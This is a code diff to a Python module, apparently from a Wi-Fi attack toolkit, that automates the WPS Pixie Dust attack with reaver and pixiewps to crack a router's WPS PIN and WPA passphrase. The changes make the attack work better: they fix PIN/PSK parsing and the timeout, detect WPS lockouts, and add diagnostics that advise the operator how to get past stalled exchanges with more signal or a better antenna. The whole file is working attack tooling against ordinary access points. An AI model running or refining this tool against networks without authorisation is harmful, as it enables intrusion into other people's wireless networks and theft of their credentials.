@@ -1,5 +1,6 @@
 # pixie_dust.py — WPS Pixie Dust attack via reaver + pixiewps
 import os
+import re
 import shutil
 import signal
 import subprocess
@@ -8,6 +9,7 @@ import time
 from dataclasses import dataclass
 from wifi_nightmare.logger import logger
 from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_RESET
+from wifi_nightmare.utils import mask_bssid, mask_bssid_filename, safe_ssid as sanitize_ssid, scrub_bssid
 
 
 @dataclass
@@ -96,11 +98,15 @@ class PixieDustAttack:
             )
             output = proc.stdout.lower() + proc.stderr.lower()
 
-            # Check for "WPS Locked: Yes" or just the words
+            # wash prints the lock state as a "Yes/No" cell in the target's
+            # table row (its "Lck" column), not always as "WPS Locked:" text.
             if "wps locked" in output:
                 return "locked"
-            if self.target_bssid.lower() in output:
-                return "available"
+            for ln in output.splitlines():
+                if self.target_bssid.lower() in ln:
+                    if re.search(r'\byes\b', ln):
+                        return "locked"
+                    return "available"
             return "not_found"
         except FileNotFoundError:
             logger.debug("wash not found, skipping WPS check")
@@ -116,13 +122,17 @@ class PixieDustAttack:
         stripped = line.strip()
         self._output_lines.append(stripped)
 
+        handled = False
+
         # --- WPS PIN ---
         if "WPS PIN:" in stripped:
             try:
                 pin_part = stripped.split("WPS PIN:")[-1].strip()
-                pin = pin_part.split()[0] if pin_part else ""
+                # reaver prints "WPS PIN: '12345678'" — strip the quotes
+                pin = pin_part.split()[0].strip("'\"") if pin_part else ""
                 if pin:
                     result.pin = pin
+                    handled = True
                     print(f"\n{C_GREEN}[+] WPS PIN Found: {pin}{C_RESET}")
             except Exception:
                 pass
@@ -131,20 +141,22 @@ class PixieDustAttack:
         if "WPA PSK:" in stripped:
             try:
                 psk_part = stripped.split("WPA PSK:")[-1].strip()
-                psk = psk_part.split()[0] if psk_part else ""
+                # reaver prints "WPA PSK: 'password'" — strip the quotes
+                psk = psk_part.split()[0].strip("'\"") if psk_part else ""
                 if psk:
                     result.psk = psk
+                    handled = True
                     print(f"{C_GREEN}[+] WPA PSK Found: {psk}{C_RESET}")
             except Exception:
                 pass
 
-        # Show informative lines
-        for keyword in ("PKR", "E-S1", "E-S2", "Pixie Dust", "pixiewps",
-                        "[P]", "[+]", "WPS PIN", "WPA PSK",
-                        "Sending:", "Received:"):
-            if keyword.lower() in stripped.lower():
-                print(f"    {C_CYAN}{stripped}{C_RESET}")
-                break
+        # Show informative lines (skip ones already printed by the handlers above)
+        if not handled:
+            for keyword in ("PKR", "E-S1", "E-S2", "Pixie Dust", "pixiewps",
+                            "[P]", "Sending:", "Received:"):
+                if keyword.lower() in stripped.lower():
+                    print(f"    {C_CYAN}{stripped}{C_RESET}")
+                    break
 
         # Warnings / errors
         if "WPS version not supported" in stripped:
@@ -170,6 +182,67 @@ class PixieDustAttack:
             pass
         except Exception as e:
             logger.debug(f"Output reader error: {e}")
+
+    def _diagnose_failure(self):
+        """Inspect the captured reaver output and explain where the attack got stuck.
+
+        Returns a list of (severity, message) tuples; severity is "red" for
+        definitive problems, "yellow" for likely causes.
+        """
+        if not self._output_lines:
+            return [("yellow", "No reaver output was captured. Check that the "
+                                "interface exists and is in monitor mode.")]
+
+        lower = [ln.lower() for ln in self._output_lines]
+
+        def has(*needles):
+            return any(any(n in ln for n in needles) for ln in lower)
+
+        saw_m1 = has("received m1")
+        saw_m3 = has("received m3")
+        ran_pixiewps = has("pixiewps", "pin not found", "pin found")
+        locked = has("wps locked", "recurring timeout", "attempts remaining",
+                     "try again in", "too many attempts")
+        deauths = has("deauth")
+        nacks = has("nack")
+
+        hints = []
+        if not saw_m1:
+            hints.append(("red", "reaver never received the target's WPS M1 message "
+                                 "- the exchange never started."))
+            hints.append(("yellow", "Check: interface in monitor mode, channel "
+                                    "correct, and WPS actually enabled on the target."))
+        elif not saw_m3:
+            hints.append(("yellow", "The WPS exchange started but stalled before M3 "
+                                    "- reaver never reached the pixiewps crack step."))
+            if locked:
+                hints.append(("yellow", "The AP is WPS-locked or rate-limited from "
+                                        "repeated attempts. Reboot it or wait for the "
+                                        "lockout to clear."))
+            if deauths:
+                hints.append(("yellow", "The AP is deauthenticating reaver - weak "
+                                        "signal, or another interface (e.g. airodump/scan) "
+                                        "is stealing the channel from reaver."))
+            if nacks:
+                hints.append(("yellow", "The AP is NACKing the exchange (WPS lockout "
+                                        "or an unsupported flow)."))
+            hints.append(("yellow", "Weak signal (below ~-85 dBm) also stalls the "
+                                    "exchange - move closer or use a higher-gain antenna."))
+        elif not ran_pixiewps:
+            hints.append(("yellow", "The exchange completed through M3 but reaver "
+                                    "never invoked pixiewps - re-run with -vv and "
+                                    "inspect the log."))
+        else:
+            hints.append(("yellow", "pixiewps ran and found no PIN. Its crack recovers "
+                                    "the AP's E-S1/E-S2 from a weak nonce generator "
+                                    "(Ralink/eCos/RTL); no match means the target very "
+                                    "likely is NOT Pixie-vulnerable."))
+        return hints
+
+    def _print_failure_diagnosis(self):
+        for severity, msg in self._diagnose_failure():
+            color = C_RED if severity == "red" else C_YELLOW
+            print(f"{color}    {msg}{C_RESET}")
 
     def run(self):
         start_time = time.time()
@@ -203,12 +276,13 @@ class PixieDustAttack:
             print(f"{C_YELLOW}[*] wash not available, skipping WPS check{C_RESET}")
 
         # 4. Start reaver with timeout monitor
-        print(f"\n{C_CYAN}[*] Starting Pixie Dust Attack on {self.target_bssid}{C_RESET}")
+        print(f"\n{C_CYAN}[*] Starting Pixie Dust Attack on {mask_bssid(self.target_bssid)}{C_RESET}")
         print(f"{C_CYAN}    Channel: {self.target_channel} | Timeout: {self.timeout}s{C_RESET}")
         print(f"{C_YELLOW}[*] Launching reaver...{C_RESET}\n")
 
-        output_file = f"/tmp/pixie_dust_{self.target_bssid.replace(':', '-')}_{int(time.time())}.out"
-
+        # NOTE: no "-o" here — reaver's -o redirects ALL output to the file,
+        # which would starve the stdout parser below (WPS PIN / WPA PSK are
+        # parsed from stdout). Output is captured via the reader thread instead.
         reaver_cmd = [
             "reaver",
             "-i", self.interface,
@@ -216,10 +290,12 @@ class PixieDustAttack:
             "-c", str(self.target_channel),
             "-K", "1",       # pixiewps mode
             "-vv",           # verbose
-            "-f",            # fixed channel
-            "-o", output_file
+            "-f"             # fixed channel
         ]
 
+        # reader is created inside the try below; initialize here so the
+        # finally block can't hit a NameError if Popen fails before it exists.
+        reader = None
         try:
             self._process = subprocess.Popen(
                 reaver_cmd,
@@ -239,14 +315,20 @@ class PixieDustAttack:
             )
             reader.start()
 
-            # Monitor thread: enforce timeout
-            timeout_monitor = threading.Thread(
-                target=lambda: (
-                    self._stop_event.wait(self.timeout),
-                    self._kill_reaver() if self._stop_event.is_set() else None
-                ),
-                daemon=True
-            )
+            # Monitor thread: enforce timeout.
+            # _stop_event.wait(timeout) returns False when the timeout elapses —
+            # that's the case we must kill reaver on. (The old lambda only killed
+            # when _stop_event was set, so the timeout never actually fired.)
+            def _timeout_watchdog():
+                timed_out = not self._stop_event.wait(self.timeout)
+                if timed_out:
+                    # Set the stop event too, so the failure reason below is
+                    # reported as a timeout instead of "not vulnerable".
+                    print(f"\n{C_YELLOW}[!] Timeout reached ({self.timeout}s). Stopping reaver...{C_RESET}")
+                    self._stop_event.set()
+                self._kill_reaver()
+
+            timeout_monitor = threading.Thread(target=_timeout_watchdog, daemon=True)
             timeout_monitor.start()
 
             # Wait for reaver to finish or be killed
@@ -274,8 +356,9 @@ class PixieDustAttack:
         finally:
             # Make sure everything is stopped
             self._kill_reaver()
-            # Give reader thread a moment to finish
-            if reader.is_alive():
+            # Give reader thread a moment to finish (guard: reader may be None
+            # if Popen failed before the thread was created)
+            if reader is not None and reader.is_alive():
                 reader.join(timeout=2)
 
         result.elapsed = time.time() - start_time
@@ -286,7 +369,7 @@ class PixieDustAttack:
             print(f"\n{C_GREEN}{'='*50}{C_RESET}")
             print(f"{C_GREEN}        PIXIE DUST ATTACK SUCCESS{C_RESET}")
             print(f"{C_GREEN}{'='*50}{C_RESET}")
-            print(f"  BSSID    : {C_WHITE}{result.bssid}{C_RESET}")
+            print(f"  BSSID    : {C_WHITE}{mask_bssid(result.bssid)}{C_RESET}")
             print(f"  SSID     : {C_CYAN}{result.ssid}{C_RESET}")
             print(f"  Channel  : {C_YELLOW}{result.channel}{C_RESET}")
             print(f"  WPS PIN  : {C_GREEN}{result.pin}{C_RESET}")
@@ -295,14 +378,16 @@ class PixieDustAttack:
             print(f"{C_GREEN}{'='*50}{C_RESET}")
             logger.info(f"Pixie Dust success: PIN={result.pin}, PSK={result.psk}")
 
-            # Keep the output file on success
-            try:
-                if os.path.exists(output_file):
-                    debug_path = f"pixie_dust_{self.target_bssid.replace(':', '-')}.out"
-                    shutil.move(output_file, debug_path)
+            # Keep the raw output as a log file on success
+            if result.raw_output:
+                try:
+                    debug_path = (f"pixie_dust_{sanitize_ssid(self.target_ssid)}_"
+                                  f"{mask_bssid_filename(self.target_bssid)}.out")
+                    with open(debug_path, "w") as f:
+                        f.write(scrub_bssid(result.raw_output, self.target_bssid))
                     print(f"{C_CYAN}  Log file: {debug_path}{C_RESET}")
-            except Exception:
-                pass
+                except Exception:
+                    pass
 
             return result
 
@@ -312,14 +397,16 @@ class PixieDustAttack:
             print(f"{C_YELLOW}    Try connecting with PIN manually via WPS{C_RESET}")
             logger.info(f"Pixie Dust partial: PIN={result.pin}, no PSK")
 
-            # Keep the output on partial success too
-            try:
-                if os.path.exists(output_file):
-                    debug_path = f"pixie_dust_{self.target_bssid.replace(':', '-')}.out"
-                    shutil.move(output_file, debug_path)
+            # Keep the raw output as a log file on partial success too
+            if result.raw_output:
+                try:
+                    debug_path = (f"pixie_dust_{sanitize_ssid(self.target_ssid)}_"
+                                  f"{mask_bssid_filename(self.target_bssid)}.out")
+                    with open(debug_path, "w") as f:
+                        f.write(scrub_bssid(result.raw_output, self.target_bssid))
                     print(f"{C_CYAN}  Log file: {debug_path}{C_RESET}")
-            except Exception:
-                pass
+                except Exception:
+                    pass
 
             return result
 
@@ -331,28 +418,20 @@ class PixieDustAttack:
             print(f"{C_YELLOW}    Reason: Interrupted{C_RESET}")
         else:
             print(f"{C_RED}    Target may not be vulnerable to this attack{C_RESET}")
-            print(f"{C_YELLOW}    Possible reasons:{C_RESET}")
-            print(f"{C_YELLOW}    - Target uses non-vulnerable WPS implementation{C_RESET}")
-            print(f"{C_YELLOW}    - WPS is disabled on the target{C_RESET}")
-            print(f"{C_YELLOW}    - Signal quality too poor for WPS exchange{C_RESET}")
-            print(f"{C_YELLOW}    - reaver/pixiewps version mismatch{C_RESET}")
 
-            # Save raw output for debugging on failure (only if there was any output)
+        # Post-mortem + debug log for non-interrupt failures. A timeout with no
+        # explanation is exactly when the raw reaver log is most useful.
+        if not (self._stop_event.is_set() and result.elapsed < self.timeout):
+            self._print_failure_diagnosis()
             if self._output_lines:
                 try:
-                    debug_path = f"pixie_dust_debug_{self.target_bssid.replace(':', '-')}.out"
+                    debug_path = (f"pixie_dust_debug_{sanitize_ssid(self.target_ssid)}_"
+                                  f"{mask_bssid_filename(self.target_bssid)}.out")
                     with open(debug_path, "w") as f:
-                        f.write(result.raw_output)
+                        f.write(scrub_bssid(result.raw_output, self.target_bssid))
                     print(f"{C_YELLOW}    Debug output saved to: {debug_path}{C_RESET}")
                 except Exception:
                     pass
-
-        # Delete temp file
-        try:
-            if os.path.exists(output_file):
-                os.remove(output_file)
-        except OSError:
-            pass
 
         logger.info(f"Pixie Dust failed for {self.target_bssid}")
         return None
